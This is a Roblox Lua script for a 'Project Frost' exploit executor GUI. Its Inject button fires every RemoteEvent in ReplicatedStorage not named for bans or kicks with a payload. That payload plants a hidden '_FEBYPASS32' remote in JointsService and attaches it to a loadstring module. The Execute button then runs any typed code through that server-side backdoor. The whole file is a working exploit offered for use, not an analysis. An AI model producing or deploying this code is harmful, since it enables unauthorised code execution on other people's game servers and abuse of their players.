local CollectionService = game:GetService("CollectionService")
local G2L = {}

G2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"))
G2L["ScreenGui_1"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
CollectionService:AddTag(G2L["ScreenGui_1"], "main")

G2L["Frame_2"] = Instance.new("Frame", G2L["ScreenGui_1"])
G2L["Frame_2"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["Frame_2"].Size = UDim2.new(0.65469, 0, 0.61995, 0)
G2L["Frame_2"].Position = UDim2.new(0.02187, 0, 0.04852, 0)
G2L["Frame_2"].Active = true
G2L["Frame_2"].Draggable = true

G2L["Clear_3"] = Instance.new("TextButton", G2L["Frame_2"])
G2L["Clear_3"].TextWrapped = true
G2L["Clear_3"].TextScaled = true
G2L["Clear_3"].BackgroundColor3 = Color3.fromRGB(207, 207, 207)
G2L["Clear_3"].Size = UDim2.new(0.14081, 0, 0.23043, 0)
G2L["Clear_3"].Text = "CLEAR"
G2L["Clear_3"].Name = "Clear"
G2L["Clear_3"].Position = UDim2.new(0.85442, 0, 0.36087, 0)

G2L["Close_5"] = Instance.new("TextButton", G2L["Frame_2"])
G2L["Close_5"].TextWrapped = true
G2L["Close_5"].BorderSizePixel = 0
G2L["Close_5"].TextScaled = true
G2L["Close_5"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["Close_5"].BackgroundTransparency = 1
G2L["Close_5"].Size = UDim2.new(0.01909, 0, 0.06087, 0)
G2L["Close_5"].Text = "X"
G2L["Close_5"].Name = "Close"
G2L["Close_5"].Position = UDim2.new(0.98091, 0, -0.00435, 0)

G2L["Execute_7"] = Instance.new("TextButton", G2L["Frame_2"])
G2L["Execute_7"].TextWrapped = true
G2L["Execute_7"].TextScaled = true
G2L["Execute_7"].BackgroundColor3 = Color3.fromRGB(207, 207, 207)
G2L["Execute_7"].Size = UDim2.new(0.14081, 0, 0.23043, 0)
G2L["Execute_7"].Text = "EXE"
G2L["Execute_7"].Name = "Execute"
G2L["Execute_7"].Position = UDim2.new(0.85442, 0, 0.1087, 0)

G2L["Inject_9"] = Instance.new("TextButton", G2L["Frame_2"])
G2L["Inject_9"].TextWrapped = true
G2L["Inject_9"].TextScaled = true
G2L["Inject_9"].BackgroundColor3 = Color3.fromRGB(207, 207, 207)
G2L["Inject_9"].Size = UDim2.new(0.14081, 0, 0.23043, 0)
G2L["Inject_9"].Text = "INJECT"
G2L["Inject_9"].Name = "Inject"
G2L["Inject_9"].Position = UDim2.new(0.85442, 0, 0.61739, 0)

G2L["TextLabel_b"] = Instance.new("TextLabel", G2L["Frame_2"])
G2L["TextLabel_b"].BorderSizePixel = 0
G2L["TextLabel_b"].TextXAlignment = Enum.TextXAlignment.Left
G2L["TextLabel_b"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["TextLabel_b"].Size = UDim2.new(0.21002, 0, 0.04348, 0)
G2L["TextLabel_b"].Text = "🐱  Project Frost (private)"

G2L["Injectedstatus_c"] = Instance.new("TextLabel", G2L["Frame_2"])
G2L["Injectedstatus_c"].BorderSizePixel = 0
G2L["Injectedstatus_c"].BackgroundColor3 = Color3.fromRGB(255, 0, 0)
G2L["Injectedstatus_c"].TextColor3 = Color3.fromRGB(255, 0, 0)
G2L["Injectedstatus_c"].BackgroundTransparency = 1
G2L["Injectedstatus_c"].Size = UDim2.new(0.16229, 0, 0.04348, 0)
G2L["Injectedstatus_c"].Text = "Not Injected!"
G2L["Injectedstatus_c"].Name = "Injectedstatus"
G2L["Injectedstatus_c"].Position = UDim2.new(0.00955, 0, 0.94783, 0)

G2L["Injected?_d"] = Instance.new("BoolValue", G2L["Injectedstatus_c"])
G2L["Injected?_d"].Name = "Injected?"

G2L["TextBox_e"] = Instance.new("TextBox", G2L["Frame_2"])
G2L["TextBox_e"].CursorPosition = -1
G2L["TextBox_e"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["TextBox_e"].Size = UDim2.new(0.81384, 0, 0.87826, 0)
G2L["TextBox_e"].Position = UDim2.new(0.00955, 0, 0.04783, 0)
G2L["TextBox_e"].Text = ""

G2L["Frame_f"] = Instance.new("Frame", G2L["TextBox_e"])
G2L["Frame_f"].BorderSizePixel = 0
G2L["Frame_f"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["Frame_f"].Size = UDim2.new(1.00293, 0, 0.01485, 0)
G2L["Frame_f"].Position = UDim2.new(0, 0, 0.99505, 0)

G2L["Frame2_10"] = Instance.new("Frame", G2L["TextBox_e"])
G2L["Frame2_10"].BorderSizePixel = 0
G2L["Frame2_10"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["Frame2_10"].Size = UDim2.new(0.03519, 0, 1.00495, 0)
G2L["Frame2_10"].Position = UDim2.new(0.96774, 0, -0.00495, 0)
G2L["Frame2_10"].Name = "Frame2"

G2L["ArrowUp_11"] = Instance.new("TextButton", G2L["Frame2_10"])
G2L["ArrowUp_11"].TextWrapped = true
G2L["ArrowUp_11"].BorderSizePixel = 0
G2L["ArrowUp_11"].TextScaled = true
G2L["ArrowUp_11"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["ArrowUp_11"].BackgroundTransparency = 1
G2L["ArrowUp_11"].Size = UDim2.new(0.91667, 0, 0.08374, 0)
G2L["ArrowUp_11"].Text = "^"
G2L["ArrowUp_11"].Name = "ArrowUp"
G2L["ArrowUp_11"].Position = UDim2.new(0.08333, 0, 0, 0)

G2L["ArrowDown_12"] = Instance.new("TextButton", G2L["Frame2_10"])
G2L["ArrowDown_12"].TextWrapped = true
G2L["ArrowDown_12"].BorderSizePixel = 0
G2L["ArrowDown_12"].TextScaled = true
G2L["ArrowDown_12"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["ArrowDown_12"].BackgroundTransparency = 1
G2L["ArrowDown_12"].Size = UDim2.new(1.5, 0, 0.14286, 0)
G2L["ArrowDown_12"].Text = "ˇ"
G2L["ArrowDown_12"].Name = "ArrowDown"
G2L["ArrowDown_12"].Position = UDim2.new(-0.25, 0, 0.93103, 0)

G2L["Frame_13"] = Instance.new("Frame", G2L["Frame2_10"])
G2L["Frame_13"].BorderSizePixel = 0
G2L["Frame_13"].BackgroundColor3 = Color3.fromRGB(133, 133, 133)
G2L["Frame_13"].Size = UDim2.new(1, 0, 0.23645, 0)
G2L["Frame_13"].Position = UDim2.new(0, 0, 0.06404, 0)

G2L["UIAspectRatioConstraint_14"] = Instance.new("UIAspectRatioConstraint", G2L["Frame_2"])
G2L["UIAspectRatioConstraint_14"].AspectRatio = 1.82174

local RemoteToRunOffOf = nil

-- YOUR NEW BUTTON LOGIC BELOW

G2L["Close_5"].MouseButton1Click:Connect(function()
    G2L["ScreenGui_1"]:Destroy()
end)

G2L["Clear_3"].MouseButton1Click:Connect(function()
    G2L["TextBox_e"].Text = ""
end)

G2L["Inject_9"].MouseButton1Click:Connect(function()
    local function b_G_V12(see)
        local function a(ree)
            ree:FireServer([[
                local folder = Instance.new('RemoteEvent')
                folder.Name = "_FEBYPASS32"
                folder.Parent = game:GetService("JointsService")
                local loadstring = require(13684410229)
                folder.OnServerEvent:Connect(function(_1,_2)
                   loadstring(_2)()
                end)
            ]])
        end
        for i, v in pairs(see:GetChildren()) do
            if v:IsA("RemoteEvent") then
                if not string.match(string.lower(v.Name), "ban") and not string.match(string.lower(v.Name), "kick") then
                    a(v)
                end
            end
            b_G_V12(v)
        end
    end
    b_G_V12(game:GetService("ReplicatedStorage"))
    local timetoken = 0
    local maxtime = 5
    repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
    if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
        G2L["Inject_9"].Text = "Injected"
        RemoteToRunOffOf = game:GetService("JointsService"):FindFirstChild("_FEBYPASS32")
        G2L["Injectedstatus_c"].BackgroundTransparency = 1
        G2L["Injectedstatus_c"].TextColor3 = Color3.fromRGB(0, 255, 0)
        G2L["Injectedstatus_c"].Text = "Injected!"
        G2L["Injected?_d"].Value = true
    else
        G2L["Injectedstatus_c"].BackgroundTransparency = 0
        G2L["Injectedstatus_c"].BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        G2L["Injectedstatus_c"].TextColor3 = Color3.fromRGB(255, 0, 0)
        G2L["Injectedstatus_c"].Text = "Failed To Inject."
        G2L["Injected?_d"].Value = false
    end
end)

G2L["Execute_7"].MouseButton1Click:Connect(function()
    if RemoteToRunOffOf and RemoteToRunOffOf.Parent == game:GetService("JointsService") then
        RemoteToRunOffOf:FireServer(G2L["TextBox_e"].Text)
    else
        warn("Failed to loadstring: Error 404")
    end
end)

return G2L["ScreenGui_1"], require
